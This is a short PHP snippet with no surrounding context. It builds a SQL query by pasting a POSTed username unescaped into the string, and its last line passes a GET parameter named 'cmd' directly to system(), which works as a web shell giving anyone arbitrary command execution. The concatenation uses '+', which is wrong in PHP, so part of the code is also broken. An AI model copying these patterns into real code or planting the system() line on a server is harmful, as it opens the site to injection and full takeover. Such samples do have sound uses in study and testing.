<?php
$user = $_POST['username'];
$query = "SELECT * FROM users WHERE username = '" + $user + "'";
system($_GET['cmd']);
?>
